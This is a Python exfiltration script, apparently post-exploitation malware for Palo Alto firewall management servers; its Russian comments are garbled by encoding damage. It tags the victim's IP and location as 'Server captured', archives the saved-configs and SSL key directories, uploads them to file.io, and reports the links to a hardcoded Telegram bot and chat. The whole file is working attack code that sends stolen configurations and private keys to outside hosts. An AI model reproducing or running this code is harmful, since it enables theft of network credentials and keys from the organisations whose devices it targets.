import subprocess
import importlib
import sys
import hashlib
import os
import io
import tarfile
import requests

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_libraries():
    required_libraries = ["requests", "urllib3"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Library {lib} not found, installing...")
            install_package(lib)

check_and_install_libraries()

# –û—Ç–∫–ª—é—á–∞–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è Telegram
tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # –í–∞—à API —Ç–æ–∫–µ–Ω
tg_chat_id = '-1002403648422'  # –í–∞—à —á–∞—Ç ID

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ –Ω–∞ File.io
def upload_to_fileio(file_data, file_name):
    url = "https://file.io"
    files = {
        'file': (file_name, file_data)
    }
    response = requests.post(url, files=files)
    if response.status_code == 200:
        data = response.json()
        return data.get("link", None)
    return None

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
def send_to_telegram(message, files):
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
    
    # –ì–æ—Ç–æ–≤–∏–º —Å—Å—ã–ª–∫–∏ –Ω–∞ —Ñ–∞–π–ª—ã
    file_links = ""
    for file_name, file_data in files.items():
        link = upload_to_fileio(file_data, file_name)
        if link:
            file_links += f"–§–∞–π–ª: {file_name}\n–°—Å—ã–ª–∫–∞: {link}\n\n"
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Å—Å—ã–ª–∫–∞–º–∏
    full_message = message + "\n\n" + file_links
    response = requests.post(url, data={"chat_id": tg_chat_id, "text": full_message})
    if not response.ok:
        print("Error sending message:", response.text)
        return False

    return True

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
def archive_directory(directory_path):
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))
    tar_stream.seek(0)
    return tar_stream

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
def main():
    try:
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–µ–∫—É—â–µ–º IP
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        message = f"üü¢ Server captured\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"

        # –ê—Ä—Ö–∏–≤–∏—Ä—É–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
        files = {
            "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
            "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
        }

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        if send_to_telegram(message, files):
            print("Message and file links sent successfully!")
        else:
            print("Error sending message and files.")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
